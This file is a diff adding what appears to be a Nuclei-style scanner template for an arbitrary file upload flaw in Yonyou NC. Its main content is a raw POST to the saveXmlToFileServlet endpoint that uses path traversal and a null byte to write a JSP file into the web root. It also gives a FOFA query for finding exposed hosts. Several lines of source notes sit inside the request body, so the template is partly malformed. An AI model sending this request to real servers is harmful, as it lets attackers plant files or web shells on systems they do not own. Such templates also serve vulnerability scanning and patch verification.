@@ -1,0 +1,60 @@
+id: poc-gladtnprg7hrkls3
+info:
+  name: 用友NC doPost接口 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gladtnprg7hrkls3'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gladtnprg7hrkls3
+    fofa: title="YONYOU NC"
+http:
+- raw:
+  - 'POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..%5C..%5C..%5Cwebapps%5Cnc_web%5Cdudesite.jsp%00 HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Cookie: LA_K1=langid
+
+
+    serverEnable: localserver
+
+
+    Content-Type: application/octet-stream
+
+
+    Content-Encoding: UTF_8
+
+
+
+
+    dudesite
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /dudesite.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
